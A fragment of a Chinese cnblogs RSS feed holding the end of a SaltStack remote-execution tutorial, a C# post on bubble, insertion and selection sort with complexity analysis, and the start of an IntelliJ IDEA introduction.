    &lt;/span&gt;-&lt;span&gt; test.kwarg
    &lt;/span&gt;-&lt;span&gt; test.module_report
    &lt;/span&gt;-&lt;span&gt; test.not_loaded
    &lt;/span&gt;-&lt;span&gt; test.opts_pkg
    &lt;/span&gt;-&lt;span&gt; test.outputter
    &lt;/span&gt;-&lt;span&gt; test.ping
    &lt;/span&gt;-&lt;span&gt; test.provider
    &lt;/span&gt;-&lt;span&gt; test.providers
    &lt;/span&gt;-&lt;span&gt; test.rand_sleep
    &lt;/span&gt;-&lt;span&gt; test.rand_str
    &lt;/span&gt;-&lt;span&gt; test.retcode
    &lt;/span&gt;-&lt;span&gt; test.sleep
    &lt;/span&gt;-&lt;span&gt; test.stack
    &lt;/span&gt;-&lt;span&gt; test.try_
    &lt;/span&gt;-&lt;span&gt; test.tty
    &lt;/span&gt;-&lt;span&gt; test.version
    &lt;/span&gt;-&lt;span&gt; test.versions_information
    &lt;/span&gt;- test.versions_report
&lt;/pre&gt;&lt;/div&gt;
&lt;span class=&quot;cnblogs_code_collapse&quot;&gt;test其他函数&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;cmd运行命令：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; cmd是超级模块，所有shell命令都能执行&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; cmd.run &lt;span&gt;'&lt;/span&gt;&lt;span&gt;ps -ef|grep python&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;pkg安装命令：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;在minion上安装nginx&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; pkg.install &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;卸载minion上的nginx&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; pkg.remove &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt;检查pkg包的版本&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; pkg.version &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;service管理服务模块：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; service.start &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 启动nginx&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; service.status &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 重启nginx&lt;/span&gt;
[root@master ~]$salt &lt;span&gt;'&lt;/span&gt;&lt;span&gt;slave&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; service.stop &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;nginx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 停止nginx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;--out 控制salt命令结果输出的格式：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; JSON&lt;/span&gt;
[root@master ~]$salt --out=json &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; cmd.run_all &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hostname&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回json格式&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; YAML&lt;/span&gt;
[root@master ~]$salt --out=yaml &lt;span&gt;'&lt;/span&gt;&lt;span&gt;*&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; cmd.run_all &lt;span&gt;'&lt;/span&gt;&lt;span&gt;hostname&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;  &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回YAML格式&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Fri, 18 Jan 2019 15:33:00 +0000</pubDate>
<dc:creator>温而新</dc:creator>
<og:description>引入 简介 saltstack是由thomas Hatch于2011年创建的一个开源项目，设计初衷是为了实现一个快速的远程执行系统。 早期运维人员会根据自己的生产环境来写特定脚本完成大量重复性工作，这</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/peng104/p/10290194.html</dc:identifier>
</item>
<item>
<title>经典排序算法 — C# 版（上） - K战神</title>
<link>http://www.cnblogs.com/sunchong/p/10150288.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sunchong/p/10150288.html</guid>
<description>&lt;p&gt;提起排序，与我们的息息相关，平时开发的代码少不了排序。&lt;/p&gt;
&lt;p&gt;经典的排序算法又非常多，我们怎么评价一个排序算法的好坏呢？&lt;/p&gt;
&lt;p&gt;其实可以这样想，要细致的比较排序算法好坏,那我们就从多方面尽可能详细的对比&lt;/p&gt;

&lt;h4&gt;一、效率方面&lt;/h4&gt;
&lt;p&gt;1、排序算法的执行效率：最好、最坏、平均&lt;/p&gt;
&lt;p&gt;2、 我们之前舍弃的时间复杂度的系数、常量、低阶，在这里需要拿回来&lt;/p&gt;
&lt;p&gt;3、排序，免不了比较和移动&lt;/p&gt;

&lt;h4&gt;二、内存消耗方面&lt;/h4&gt;
&lt;p&gt;没错就是 算法的空间复杂度，不过对于排序的空间复杂度来说，又赋予了新的名词 — 原地排序。&lt;/p&gt;
&lt;p&gt;顾名思义是 原地排序的肯定是消耗内存少，反之需要往外走几步那就需要临时申请内存了。&lt;/p&gt;
&lt;p&gt;原地排序 = O(1)&lt;/p&gt;

&lt;h4&gt;三、算法稳定性&lt;/h4&gt;
&lt;p&gt;字面意义就是不论怎么摆弄，这个算法稳定，不会对顺序有影响。&lt;/p&gt;
&lt;p&gt;上面这句话应该加上一个定语：对于拥有相同值的元素的前后顺序不会发生改变。&lt;/p&gt;
&lt;p&gt;举个例子：有两个对象，其中的金额字段一样，按照金额排序，经过算法一顿折腾后，相同金额的对象先后顺序不能发生改变。&lt;/p&gt;

&lt;p&gt;讲完评估排序算法的优劣的几个方面，那就直接看看我们平时常见的几个经典算法：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1、冒泡排序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图例演示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190116234013889-1331014274.gif&quot; alt=&quot;&quot; width=&quot;428&quot; height=&quot;241&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;gt; C#&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;          &lt;span&gt;//&lt;/span&gt;&lt;span&gt;排序 — 冒泡排序&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt;         &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; BubbleSort(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;[] source)
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (source.Length &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;             &lt;span&gt;bool&lt;/span&gt; isChanged = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; source.Length; i++&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;            {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;                 &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; source.Length - i - &lt;span&gt;1&lt;/span&gt;; j++&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; &lt;span&gt;                {
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;                     &lt;span&gt;var&lt;/span&gt; left =&lt;span&gt; source[j];
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;                     &lt;span&gt;var&lt;/span&gt; right = source[j + &lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;                     Console.WriteLine(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;【比较】&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt; (left &amp;lt;=&lt;span&gt; right)
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;                         &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt;                     source[j] =&lt;span&gt; right;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt;                     source[j + &lt;span&gt;1&lt;/span&gt;] =&lt;span&gt; left;
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;                     isChanged = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;                     Console.WriteLine(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{交换}&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isChanged)
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt;                     &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;            Printf(source);
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;         }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：冒泡排序的时间算法复杂度&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：最坏时间复杂度 — O(n^2)：循环 n*n次&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　  最好时间复杂度 — O(n)    ：循环 n次即可&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　  平均时间复杂度 — O(?)&lt;/p&gt;
&lt;p&gt;           这里我们使用概率来分析平均复杂度，情况比较复杂。&lt;/p&gt;
&lt;p&gt;　　　我们使用一种新的概念来分析平均复杂度，这个就是 有序度。&lt;/p&gt;
&lt;p&gt;           有序度：看作是向量，左&amp;lt;= 右&lt;/p&gt;
&lt;p&gt;　　    逆序度：正好相反，左 &amp;gt;= 右&lt;/p&gt;
&lt;p&gt;　　　满有序度 = n*(n-1) / 2&lt;/p&gt;
&lt;p&gt;　　　逆序度 = 满有序度 - 有序度&lt;/p&gt;

&lt;p&gt;对于 n 个数据来说，最坏情况时间复杂度的有序度是0，要交换 n*(n-1)/2次才能正确输出。&lt;/p&gt;
&lt;p&gt;对于最好情况复杂度的有序度是n*(n-1)/2，需要交换0次就能达到完全有序。&lt;/p&gt;
&lt;p&gt;最坏 n*(n-1)/2次，最好0次，取个中间值来表示中间情况，也可以看作是平均情况 n*(n-1) /4&lt;/p&gt;
&lt;p&gt;所以平均下来 要做 n*(n-1) / 4 次才能有序，因为冒泡排序的时间复杂度的上限是 O(n^2)&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以平均情况时间复杂度为 O(n^2)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;虽然这样推论平均个情况并不严格，但是比起概率推论来说，这样简单且有效。&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：冒泡排序是不是原地排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：是，临时变量为了交换数据，常量级别的临时空间申请，所以空间复杂度为O(1)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：冒泡排序是不是稳定排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：是，因为没有改变相同元素的先后顺序。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt; &lt;strong&gt;2、插入排序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;假定，我们将排序串分为两个区：已排序区，未排序区&lt;/p&gt;
&lt;p&gt;一个元素要找到正确的的位置进行插入，那么需要去已排序区域找到自己的位置后，&lt;/p&gt;
&lt;p&gt;将这个位置的元素们向后移动，空出位置，然后新元素入坑。&lt;/p&gt;
&lt;p&gt;从以上这个思路来看，插入排序也是涉及到了元素的比较和移动。&lt;/p&gt;
&lt;p&gt;给我们一个无序数组，哪块是已排序区？哪里是未排序区？&lt;/p&gt;

&lt;p&gt;比如：9, 0, 1, 5, 2, 3, 6&lt;/p&gt;
&lt;p&gt;初始时，9 就是已排序区域；&lt;/p&gt;
&lt;p&gt; 0开始去已排序区域挨个比较，即 i=1，0&amp;lt;9，9向后挪动，空出位置，0入坑；&lt;/p&gt;
&lt;p&gt;1开始去 [ 0，9 ] 已排序区域比较，1 &amp;lt; 9，9向后移动腾位置，1入坑，1 &amp;gt; 0 无需操作；&lt;/p&gt;
&lt;p&gt;依次重复以上操作，即可达成有序。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;图例演示&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190117015209858-1287483886.gif&quot; alt=&quot;&quot; width=&quot;368&quot; height=&quot;207&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&amp;gt; C#&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;         &lt;span&gt;//&lt;/span&gt;&lt;span&gt;排序 — 插入排序&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt;         &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; InsertionSort(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;[] source)
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;             &lt;span&gt;if&lt;/span&gt; (source == &lt;span&gt;null&lt;/span&gt; || source.Length &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;                 &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;1&lt;/span&gt;; i &amp;lt; source.Length; i++&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             {&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 未排序区&lt;/span&gt;
&lt;span&gt; 9&lt;/span&gt;                 &lt;span&gt;var&lt;/span&gt; sorting =&lt;span&gt; source[i];
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;                 &lt;span&gt;int&lt;/span&gt; j = i - &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt;                 &lt;span&gt;for&lt;/span&gt; (; j &amp;gt;= &lt;span&gt;0&lt;/span&gt;; j--&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;                 {&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 已排序区
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt;                     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 比较&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt;                     &lt;span&gt;if&lt;/span&gt; (sorting &amp;gt;=&lt;span&gt; source[j])
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;                    {
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;                         &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;                    }
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
&lt;span&gt;21&lt;/span&gt;                     &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 后移&lt;/span&gt;
&lt;span&gt;22&lt;/span&gt;                     &lt;strong&gt;&lt;span&gt;source[j + 1] = source[j];
&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;                }
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; 
&lt;span&gt;25&lt;/span&gt;                 &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 入坑&lt;/span&gt;
&lt;span&gt;26&lt;/span&gt;                 &lt;span&gt;&lt;strong&gt;source[j + 1] = sorting;
&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;            }
&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; &lt;span&gt;            Printf(source);
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;         }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Q：插入排序的时间算法复杂度&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：最坏时间复杂度 — O(n^2)：完全倒序，循环n次，比较n次&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　  最好时间复杂度 — O(n)：完全有序，循环n次跳出&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　  平均时间复杂度 — O(n^2)：循环 n次数据，在一个数组中插入数据的平均情况时间复杂度为O(n)，所以是 O(n^2)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：插入排序是不是原地排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：是，没有临时变量申请，所以空间复杂度为O(1)&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：插入排序是不是稳定排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;A：是， if (sorting &amp;gt;= source[j]) 这个判断保证了相同元素的先后顺序不变，&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　       去掉等于号也可以发生改变。可以实现稳定排序所以说是稳定排序&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;开始我们也说了，这么多排序算法，我们要对比一下，择优选择。&lt;/p&gt;
&lt;table border=&quot;0&quot; align=&quot;left&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;排序&lt;/td&gt;
&lt;td&gt;最好情况&lt;/td&gt;
&lt;td&gt;最坏情况&lt;/td&gt;
&lt;td&gt;平均情况&lt;/td&gt;
&lt;td&gt;是否稳定&lt;/td&gt;
&lt;td&gt;是否原地&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;冒泡&lt;/td&gt;
&lt;td&gt;O(n)&lt;/td&gt;
&lt;td&gt;O(n^2)&lt;/td&gt;
&lt;td&gt;O(n^2)&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;插入&lt;/td&gt;
&lt;td&gt;O(n)&lt;/td&gt;
&lt;td&gt;O(n^2)&lt;/td&gt;
&lt;td&gt;O(n^2)&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;td&gt;是&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;



&lt;p&gt;&lt;strong&gt;那么问题来了平均都是 O(n^2)，为什么倾向于使用插入排序呢？&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这两种排序我们将常量都放进来会发现，冒泡使用的常量数比排序多，所以在数据量上来后  常量*n 会有很大的差距。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们的编程语言中的排序算法很多都会倾向于插入排序算法。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;3、选择排序&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;其实操作类似于插入排序，只不过是换了换操作方式。&lt;/p&gt;
&lt;p&gt;所以也分为 已排序区和未排序区，操作方式是在未排序区间找到最小的，然后放到已排序区间最后。&lt;/p&gt;
&lt;p&gt;图例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190117220629680-1738146059.gif&quot; alt=&quot;&quot; width=&quot;352&quot; height=&quot;198&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&amp;gt; C#&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;        private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SelectionSort(&lt;span&gt;int&lt;/span&gt;&lt;span&gt;[] source)
        {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (source.Length &amp;lt;= &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;

            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; source.Length - &lt;span&gt;1&lt;/span&gt;; i++&lt;span&gt;)
            {&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 已排序&lt;/span&gt;
                &lt;span&gt;var&lt;/span&gt; minIndex =&lt;span&gt; i;
                
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; j = i+&lt;span&gt;1&lt;/span&gt;; j &amp;lt; source.Length; j++&lt;span&gt;)
                {&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;未排序&lt;/span&gt;

                    &lt;span&gt;if&lt;/span&gt; (source[minIndex] &amp;gt;&lt;span&gt; source[j])
                    {
                        minIndex &lt;/span&gt;=&lt;span&gt; j;
                    }
                }
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (i !=&lt;span&gt; minIndex)
                {
                    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; tmp =&lt;span&gt; source[i];
                    source[i] &lt;/span&gt;=&lt;span&gt; source[minIndex];
                    source[minIndex] &lt;/span&gt;=&lt;span&gt; tmp;
                }
            }

            Printf(source);
        }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Q：选择排序的时间算法复杂度&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A：最坏时间复杂度 — O(n^2)&lt;/p&gt;
&lt;p&gt;　  最好时间复杂度 — O(n^2)&lt;/p&gt;
&lt;p&gt;　  平均时间复杂度 — O(n^2)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：选择排序是不是原地排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A：是，没有临时变量申请，所以空间复杂度为O(1)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Q：选择排序是不是稳定排序&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A：不是&lt;/p&gt;

&lt;p&gt;4、对比 随机生成1000个元素的 int 数组&lt;/p&gt;
&lt;p&gt;分别执行时间如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190118233830733-1514245197.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190118233837832-421947285.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/406456/201901/406456-20190118233843335-694395247.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Fri, 18 Jan 2019 15:30:00 +0000</pubDate>
<dc:creator>K战神</dc:creator>
<og:description>提起排序，与我们的息息相关，平时开发的代码少不了排序。 经典的排序算法又非常多，我们怎么评价一个排序算法的好坏呢？ 其实可以这样想，要细致的比较排序算法好坏,那我们就从多方面尽可能详细的对比 一、效率</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/sunchong/p/10150288.html</dc:identifier>
</item>
<item>
<title>古语云：工欲善其事必先利其器 --&gt; 最新、最全的 IntelliJ IDEA(2018.3.3)  的介绍、安装、破解、配置与使用 - 黑泽君</title>
<link>http://www.cnblogs.com/chenmingjun/p/10290183.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenmingjun/p/10290183.html</guid>
<description>&lt;h2 id=&quot;hintellijideaeclipseibm&quot;&gt;&lt;span&gt;&lt;strong&gt;一、IntelliJ IDEA 介绍 -&amp;gt; Eclipse IBM&lt;/strong&gt;&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;h1jetbrains&quot;&gt;&lt;span&gt;&lt;strong&gt;1. JetBrains 公司介绍&lt;/strong&gt;&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;IDEA(&lt;a href=&quot;https://www.jetbrains.com/idea/&quot; target=&quot;_blank&quot;&gt;https://www.jetbrains.com/idea/&lt;/a&gt;)是 JetBrains 公司的产品，公司旗下还有其&lt;br/&gt;它产品，比如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;WebStorm：用于开发 JavaScript、HTML5、CSS3 等前端技术&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;yCharm：用于开发 python&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;PhpStorm：用于开发 PHP&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;RubyMine：用于开发 Ruby/Rails&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;AppCode：用于开发 Objective - C/Swift&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;CLion：用于开发 C/C++&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;DataGrip：用于开发数据库和 SQL&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;Rider：用于开发.NET&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;GoLand：用于开发 Go&lt;/span&gt;&lt;/li&gt;
